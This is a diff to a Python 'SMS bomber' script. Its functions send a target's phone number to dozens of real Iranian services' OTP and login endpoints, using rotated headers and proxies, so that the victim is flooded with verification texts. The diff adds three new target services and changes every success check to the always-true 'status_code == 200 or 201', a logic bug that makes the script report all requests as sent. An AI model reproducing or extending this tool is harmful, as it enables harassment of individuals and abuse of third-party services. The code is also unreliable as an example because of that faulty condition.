@@ -69,7 +69,7 @@ def bama_bomber(number):
     json_request_api = {"cellNumber":"0"+number,"appname":"popuplogin","smsfor":6}
     try:
         req = requests.post(bama_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('bama Code Sent!')
         else:
             print(f"bama code: {req.status_code}")
@@ -82,7 +82,7 @@ def barghman_bomber(number):
     json_request_api = {"mobile":"0"+number,"from_meter_buy":False}
     try:
         req = requests.post(barghman_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('barghman Code Sent!')
         else:
             print(f"barghman code: {req.status_code}")
@@ -95,7 +95,7 @@ def digikala_bomber(number):
     json_request_api = {"backUrl":"/","username":number,"otp_call":"false"}
     try:
         req = requests.post(digikala_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('digikala Code Sent!')
         else:
             print(f"digikala code: {req.status_code}")
@@ -108,7 +108,7 @@ def divar_bomber(number):
     json_request_api = {"phone":number}
     try:
         req = requests.post(divar_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('divar Code Sent!')
         else:
             print(f"divar code: {req.status_code}")
@@ -121,7 +121,7 @@ def emtiaz_bomber(number):
     json_request_api = {"phone_number":"98"+number,"source":"zarinplus"}
     try:
         req = requests.post(emtiaz_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('emtiaz Code Sent!')
         else:
             print(f"emtiaz code: {req.status_code}")
@@ -133,7 +133,7 @@ def gap_bomber(number):
     gap_api = 'https://core.gap.im/v1/user/add.json?mobile=%2B98'+number
     try:
         req = requests.get(gap_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('gap Code Sent!')
         else:
             print(f"gap code: {req.status_code}")
@@ -146,7 +146,7 @@ def lenz_bomber(number):
     json_request_api = {"msisdn":"98"+number}
     try:
         req = requests.post(lenz_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('lenz Code Sent!')
         else:
             print(f"lenz code: {req.status_code}")
@@ -159,7 +159,7 @@ def sheypoor_bomber(number):
     json_request_api = {"username":number}
     try:
         req = requests.post(sheypoor_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('sheypoor Code Sent!')
         else:
             print(f"sheypoor code: {req.status_code}")
@@ -172,7 +172,7 @@ def snap_bomber(number):
     json_request_api = {"cellphone":number}
     try:
         req = requests.post(snap_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('snap Code Sent!')
         else:
             print(f"snap code: {req.status_code}")
@@ -185,7 +185,7 @@ def tapsi_bomber(number):
     json_request_api = {"credential":{"phoneNumber":number,"role":"DRIVER"}}
     try:
         req = requests.post(tapsi_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('tapsi Code Sent!')
         else:
             print(f"tapsi code: {req.status_code}")
@@ -197,7 +197,7 @@ def torob_bomber(number):
     torob_api = 'https://api.torob.com/a/phone/send-pin/?phone_number=0'+number
     try:
         req = requests.get(torob_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('torob Code Sent!')
         else:
             print(f"torob code: {req.status_code}")
@@ -210,7 +210,7 @@ def pinorest_bomber(number):
     json_request_api = {"mobile":"0"+number}
     try:
         req = requests.post(pinorest_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('pinorest code sent!')
         else:
             print(f'pinorest code: {req.status_code}')
@@ -223,7 +223,7 @@ def hamrahmechanic_bomber(number):
     json_request_api = {"PhoneNumber":"0"+number,"prevDomainUrl":"https://www.google.com/","landingPageUrl":"https://www.hamrah-mechanic.com/","orderPageUrl":"https://www.hamrah-mechanic.com/membersignin/","prevUrl":"https://www.hamrah-mechanic.com/","referrer":"https://www.google.com/"}
     try:
         req = requests.post(hamrahm_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('hamrahmechanic code sent!')
         else:
             print(f'hamrahmechanic code: {req.status_code}')
@@ -238,7 +238,7 @@ def mobit_bomber(number):
     try:
         req = requests.post(mobit_api,json=json_request_api,headers=random_choose,proxies=proxy)
         req2 = requests.post(mobit_api2,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req2.status_code or req.status_code == 200:
+        if req2.status_code or req.status_code == 200 or 201:
             print('mobit code sent!')
         else:
             print(f'mobit code: {req.status_code}')
@@ -251,7 +251,7 @@ def jabama_bomber(number):
     json_request_api = {"mobile":"0"+number}
     try:
         req = requests.post(jabama_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('jabama code sent!')
         else:
             print(f'jabama code: {req.status_code}')
@@ -267,7 +267,7 @@ def drdr_bomber(number):
         req = requests.post(drdr_api,json=json_request_api,headers=random_choose,proxies=proxy)
         req_call = requests.post(drdr_calapi,json=json_request_api,headers=random_choose,proxies=proxy)
         
-        if req_call.status_code or req.status_code == 200:
+        if req_call.status_code or req.status_code == 200 or 201:
             print('drdr code sent!')
         else:
             print(f'drdr code: {req.status_code}')
@@ -280,7 +280,7 @@ def gabzino_bomber(number):
     json_request_api = {"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":None,"ApplicationVersion":"1.0.0","MobileNumber":"0"+number,"UniqueToken":None}}
     try:
         req = requests.post(gabzino_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('gabzino code sent!')
         else:
             print(f'gabzino code: {req.status_code}')
@@ -293,7 +293,7 @@ def pinket_bomber(number):
     json_request_api = {"phoneNumber":"0"+number}
     try:
         req = requests.post(pinket_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201 or 204:
             print('pinket code sent!')
         else:
             print(f'pinket code: {req.status_code}')
@@ -306,7 +306,7 @@ def digijet_bomber(number):
     json_request_api = {"phone":"0"+number}
     try:
         req = requests.post(digijet_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('digijet code sent!')
         else:
             print(f'digijet code: {req.status_code}')
@@ -319,7 +319,7 @@ def cafebazaar_bomber(number):
     json_request_api = {"properties":{"language":2,"clientID":"vovnbz5nmw734et4oi7xcg19j69h9cha","deviceID":"vovnbz5nmw734et4oi7xcg19j69h9cha","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":"98"+number}}}
     try:
         req = requests.post(cafebazaar_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('cafebazaar code sent!')
         else:
             print(f'cafebazaar code: {req.status_code}')
@@ -332,7 +332,7 @@ def lidoma_bomber(number):
     json_request_api = {"jsonrpc":"2.0","method":"call","params":{"phone_number":"0"+number,"action":"signin"},"id":82926985}
     try:
         req = requests.post(lidoma_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('lidoma code sent!')
         else:
             print(f'lidoma code: {req.status_code}')
@@ -345,7 +345,7 @@ def vandar_bomber(number):
     json_request_api = {"mobile":"0"+number}
     try:
         req = requests.post(vandar_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('vandar code sent!')
         else:
             print(f'vandar code: {req.status_code}')
@@ -358,7 +358,7 @@ def taaghche_bomber(number):
     json_request_api = {"contact":"0"+number}
     try:
         req = requests.post(taaghche_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('taaghche code sent!')
         else:
             print(f'taaghche code: {req.status_code}')
@@ -371,7 +371,7 @@ def flightio_bomber(number):
     json_request_api = {"userKey":"98-"+number,"userKeyType":1}
     try:
         req = requests.post(flightio_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('flightio code sent!')
         else:
             print(f'flightio code: {req.status_code}')
@@ -384,7 +384,7 @@ def karnameh_bomber(number):
     json_request_api = {"phone":"0"+number}
     try:
         req = requests.post(karnameh_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('karnameh code sent!')
         else:
             print(f'karnameh code: {req.status_code}')
@@ -394,12 +394,58 @@ def karnameh_bomber(number):
 def bit24_bomber(number):
     random_choose = random.choice(heads)
     bit24_api = 'https://bit24.cash/api/auth/check-mobile'
-    json_request_api = {"mobile":"0"+number}
+    json_request_api = {"mobile":"0"+number,"country_code":"98"}
     try:
         req = requests.post(bit24_api,json=json_request_api,headers=random_choose,proxies=proxy)
-        if req.status_code == 200:
+        if req.status_code == 200 or 201:
             print('bit24 code sent!')
         else:
             print(f'bit24 code: {req.status_code}')
     except:
         print('bit24 error!')
+
+def sahmeto_bomber(number):
+    random_choose = random.choice(heads)
+    sahmeto_api = 'https://api.sahmeto.com/api/v1/auth/login'
+    json_request_api = {"ID":number}
+    try:
+        req = requests.post(sahmeto_api,json=json_request_api,headers=random_choose,proxies=proxy)
+        if req.status_code == 200 or 201:
+            print('sahmeto code sent!')
+        else:
+            print(f'sahmeto code: {req.status_code}')
+    except:
+        print('sahmeto error!')
+
+def sahmio_bomber(number):
+    random_choose = random.choice(heads)
+    sahmio_api = 'https://base-api.sahmio.ir/customer/sendVerificationCode'
+    json_request_api = {"phoneNumber":"0"+number}
+    try:
+        req = requests.post(sahmio_api,json=json_request_api,headers=random_choose,proxies=proxy)
+        if req.status_code == 200 or 201:
+            print('sahmio code sent!')
+        else:
+            print(f'sahmio code: {req.status_code}')
+    except:
+        print('sahmio error!')
+
+def pindo_bomber(number):
+    random_choose = random.choice(heads)
+    pindo_api = 'https://api.pindo.ir/v1/user/login-register/'
+    json_request_api = {"phone":"0"+number}
+    try:
+        req = requests.post(pindo_api,json=json_request_api,headers=random_choose,proxies=proxy)
+        if req.status_code == 200 or 201:
+            print('pindo code sent!')
+        else:
+            print(f'pindo code: {req.status_code}')
+    except:
+        print('pindo error!')
+
+
+
+
+
+
+
